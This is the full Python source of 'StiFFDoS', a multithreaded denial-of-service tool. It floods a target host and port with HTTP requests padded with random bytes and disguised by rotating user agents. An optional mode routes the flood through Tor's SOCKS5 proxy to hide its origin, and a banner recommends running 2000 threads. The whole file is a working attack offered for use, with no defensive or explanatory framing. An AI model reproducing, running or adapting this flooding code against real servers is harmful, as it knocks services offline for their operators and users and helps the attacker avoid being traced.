import socket
import random
import time
import threading
import sys
import cfscrape
import itertools
import argparse
import os
from datetime import timedelta
from base64 import *

start = time.time()
try:
	import socks 
	havetor = True
except ModuleNotFoundError:
	print("[!] PySocks Not Installed, Tor Option Not Available")
	havetor = False



 
def humansize(num, suffix='B'):
    for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)

class color:
	NOCOLOR='\033[0m'
	RED='\033[0;31m'
	GREEN='\033[0;32m'
	ORANGE='\033[0;33m'
	BLUE='\033[0;34m'
	PURPLE='\033[0;35m'
	CYAN='\033[0;36m'
	LIGHTGRAY='\033[0;37m'
	DARKGRAY='\033[1;30m'
	LIGHTRED='\033[1;31m'
	LIGHTGREEN='\033[1;32m'
	YELLOW='\033[1;33m'
	LIGHTBLUE='\033[1;34m'
	LIGHTPURPLE='\033[1;35m'
	LIGHTCYAN='\033[1;36m'
	WHITE='\033[1;37m'



sig = b64decode
def uagent():
	userAgent = []
	add = userAgent.append
	add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134")
	add("Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134")
	add("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36")
	return random.choice(userAgent)
import signal

def keyboardInterruptHandler(signal, frame):
    print("KeyboardInterrupt (ID: {}) has been caught. Cleaning up...".format(signal))
    exit(0)



def createData(url,metode):
	data = f'{metode} / HTTP/1.1\r\nHost: {url}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: {uagent()}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\ndnt: 1\r\nX-Requested-With: curl\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: http://{url}/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n'+str(os.urandom(random.randint(1,8192)))
	return data.encode()


ld = 10
anim = "|/—\\".replace(""," ").split()
failed = []
working = []


def dosBot(url,port,i,tunda,metode):
	global ts 
	ts = 0
	global size
	size = 0
	for anime in itertools.cycle(anim):
		resdata = createData(url,metode)
		bps = humansize(sys.getsizeof(resdata*4))
		sizeData = sys.getsizeof(resdata)
		if bps == 0:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{bps} B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		else:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{bps} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		time.sleep(0.1)
		sys.stdout.flush()
		
		try:
			t0 = time.time()
			sock = socket.socket()
			sock.connect((url,port))
			lenData = len(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.shutdown(1)
			ts = time.time() - t0
			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
			working.append(i)
			size = size + sizeData*4
		except KeyboardInterrupt:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
			sys.exit(1)
		except socket.error:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Cannot Be Reached! cause: Maybe Target Down, No Connection,{color.WHITE}"+"       "*4)
			failed.append(i)
			size = size + sizeData*4
		


def torBot(url,port,i,torrip,torport,tunda,metode):
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(torrip), int(torport), True)

	global ts 
	ts = 0
	global size
	size = 0
	global statusSend
	for anime in itertools.cycle(anim):
		resdata = createData(url,metode)
		bps = sys.getsizeof(resdata*4)
		sizeData = sys.getsizeof(createData(url,metode))
		if bps == 0:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{humansize(bps)}   B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		else:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{humansize(bps)} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		sys.stdout.flush()
		time.sleep(0.1)
		#sizeData = sys.getsizeof(createData(url,metode))
		
		try:
			t0 = time.time()
			sock = socks.socksocket()
			sock.connect((url,port))
			lenData = len(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.shutdown(1)
			ts = time.time() - t0
			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
			working.append(i)
			size = size + sizeData*4
			time.sleep(tunda)
		except KeyboardInterrupt:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
			sys.exit(1)
		except socket.error:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Cannot Be Reached! cause: Maybe Target Down, Can't Connect To Tor, No Connection, {color.WHITE}"+"       "*4)
			failed.append(i)
			size = size + sizeData*4
			
	





def run(url,port,thread,tunda,metode):
	for i in range(thread):
		print(f"[Info] Starting All Thread                                    ")
		t = threading.Thread(target=dosBot,args=(url,port,i,tunda,metode))
		t.start()


def runTor(url,port,thread,toraddr,torport,tunda,metode):
	for i in range(thread):
		print(f"[Info] Starting All Thread                                    ")
		t = threading.Thread(target=torBot,args=(url,port,i,toraddr,torport,tunda,metode))
		t.start()
		moduleLoaded = True
		
args = sys.argv

print(" ")
print ('''
   ***
  ** **
 **   **
 **   **         ****
 **   **       **   ****
 **  **       *   **   **
  **  *      *  **  ***  **
   **  *    *  **     **  *
    ** **  ** **        **
    **   **  **
   *           *
  *             *
 *    0     0    *
 *   /   @   \   *
 *   \__/ \__/   *
   *     W     *
     **     **
       ***** StiFFDoS

+-------------------------+
| I Suggest Strength 2000 |
+-------------------------+ ''')



parser = argparse.ArgumentParser(description="Python Tor Network Supported Ddos")
parser.add_argument ("-s","--target", help= "Target IP Address", type=str, dest='target', required=True )
parser.add_argument ("-p","--port", help= "Port Of Target", type=str, dest='port', required=False,default=80)
parser.add_argument ("-m","--method", help= "HTTP Method", type=str, dest='method', required=False ,default="POST")
parser.add_argument ("-t","--thread", help= "Threading", type=int, dest='thread', required=False ,default=50)
print(" ")

if havetor == True:
	parser.add_argument ("-o","--onion", help= "Attack Over Tor Network (Socks5), 127.0.0.1:9050", metavar="<host[:port]>",type=str, dest='tor', required=False)
args = parser.parse_args()
target = args.target.replace("https://","").replace("http://","")
thread = args.thread
port = args.port
sleep = 0.1
method = args.method.upper()

if method not in ["GET","HEAD","POST","PUT","DELETE","CONNECT","OPTIONS","TRACE","PATH"]:
	print(f"{color.WHITE}[{color.RED}!{color.WHITE}] "+method+" Is Not HTTP Method")
	sys.exit(1)
if havetor == True:
	tornet = args.tor
	print(tornet)
if havetor == False:
	tornet = None

if tornet or "--onion" in sys.argv or "-o" in sys.argv:
	toraddr, torport = "127.0.0.1", 9050
	toraddr, torport= tornet.split(":")
	print("[+] Target : "+str(target))
	print("[+] Port : "+str(port))
	print("[+] Method : "+str(method))
	print("[+] Thread : "+str(thread))
	print(f"[+] Tor : {toraddr}:{torport} ( Socks5 )")
	tidur = time.sleep
	print("")
	for i in range(5):
		print("The Attack Begins •°°",end="\r")
		tidur(0.4)
		print("The Attack Begins °•°",end="\r")
		tidur(0.3)
		print("The Attack Begins °°•",end="\r")
		tidur(0.2)
		print("The Attack Begins °°°",end="\r")
		tidur(0.1)
	try:
		runTor(target,int(port),thread,toraddr,torport,sleep,method)
	except KeyboardInterrupt:
		print(f"{color.WHITE}[{color.RED}!{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
		sys.exit(1)



if tornet == None:
	print("[+] Target : "+str(target))
	print("[+] Port : "+str(port))
	print("[+] Thread : "+str(thread))
	print("[+] Method : "+str(method))
	print(f"[+] Tor : Not Actived")
	print("")
	tidur = time.sleep
	for i in range(5):
		print("The Attack Begins •°°",end="\r")
		tidur(0.4)
		print("The Attack Begins °•°",end="\r")
		tidur(0.3)
		print("The Attack Begins °°•",end="\r")
		tidur(0.2)
		print("The Attack Begins °°°",end="\r")
		tidur(0.1)
	try:
		run(target,int(port),thread,sleep,method)
	except KeyboardInterrupt:
		print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
		sys.exit(1)
